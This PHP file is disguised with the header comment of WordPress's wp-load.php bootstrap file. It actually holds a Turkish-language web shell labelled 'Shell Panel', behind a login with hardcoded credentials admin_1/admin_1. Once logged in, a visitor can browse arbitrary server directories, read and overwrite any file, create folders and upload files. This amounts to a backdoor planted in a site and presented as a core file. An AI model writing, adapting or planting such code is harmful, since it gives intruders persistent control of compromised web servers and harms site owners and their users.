<?php 
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-config.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * wp-config.php file.
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */

/** Define ABSPATH as this file's directory */
session_start();

// Define Ayarlar
define('USERNAME', 'admin_1');
define('PASSWORD', 'admin_1'); // BURAYI DEĞİŞTİR

// Giriş kontrolü
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if ($_POST['username'] === USERNAME && $_POST['password'] === PASSWORD) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Hatalı kullanıcı adı veya şifre.";
        }
    }

    // Giriş formu
    ?>
    <!DOCTYPE html>
    <html lang="tr">
    <head>
    <meta charset="UTF-8">
    <title>Giriş</title>
    <style>
    body { background: #111; color: #eee; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; }
    form { background: #222; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px #000; }
    input { display: block; margin-bottom: 10px; padding: 8px; width: 100%; background: #333; color: #fff; border: 1px solid #444; border-radius: 4px; }
    button { background: #28a745; color: #fff; border: none; padding: 10px; width: 100%; border-radius: 4px; cursor: pointer; }
    button:hover { background: #218838; }
    </style>
    </head>
    <body>
    <form method="post">
        <h3>🔐 Giriş Yap</h3>
        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
        <input type="text" name="username" placeholder="Kullanıcı Adı" required>
        <input type="password" name="password" placeholder="Şifre" required>
        <button type="submit">Giriş</button>
    </form>
    </body>
    </html>
    <?php
    exit;
}

// Shell arayüzü (giriş yapılmışsa)
$path = $_GET['path'] ?? getcwd();
$path = realpath($path);

function sanitize($text) {
    return htmlspecialchars($text, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

function list_dir($dir) {
    $items = scandir($dir);
    echo "<ul>";
    foreach ($items as $item) {
        if ($item === '.') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $item;
        $link = "?path=" . urlencode($full);
        $display = sanitize($item);
        if (is_dir($full)) {
            echo "<li>📁 <a href='$link'>$display</a></li>";
        } else {
            echo "<li>📄 <a href='?edit=$display&path=" . urlencode($dir) . "'>$display</a></li>";
        }
    }
    echo "</ul>";
}

if (isset($_GET['edit'])) {
    $file = realpath($_GET['path'] . DIRECTORY_SEPARATOR . $_GET['edit']);
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($file, $_POST['content']);
        echo "<p style='color:lime;'>Kaydedildi!</p>";
    }
    $content = file_exists($file) ? file_get_contents($file) : '';
    echo "<h3>Düzenleniyor: " . basename($file) . "</h3>";
    echo "<form method='post'>";
    echo "<textarea name='content' rows='20' cols='100'>" . sanitize($content) . "</textarea><br>";
    echo "<button type='submit'>Kaydet</button>";
    echo "</form><hr>";
} else {
    echo "<h2>📁 Shell Panel</h2>";
    echo "<p>Dizin: " . sanitize($path) . "</p>";
    list_dir($path);
}

if (isset($_POST['new_folder']) && !empty($_POST['foldername'])) {
    $new = $path . DIRECTORY_SEPARATOR . basename($_POST['foldername']);
    mkdir($new);
    echo "<p style='color:lime;'>Klasör oluşturuldu.</p>";
}

if (isset($_FILES['upload'])) {
    $target = $path . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
        echo "<p style='color:lime;'>Dosya yüklendi.</p>";
    } else {
        echo "<p style='color:red;'>Yükleme başarısız.</p>";
    }
}
?>

<hr>
<h3>📂 Yeni Klasör Oluştur</h3>
<form method="post">
    <input type="text" name="foldername" placeholder="Klasör adı">
    <button type="submit" name="new_folder">Oluştur</button>
</form>

<hr>
<h3>📤 Dosya Yükle</h3>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="upload">
    <button type="submit">Yükle</button>
</form>

<hr>
<form method="post"><button type="submit" name="logout">🚪 Çıkış Yap</button></form>

<?php
if (isset($_POST['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
?>
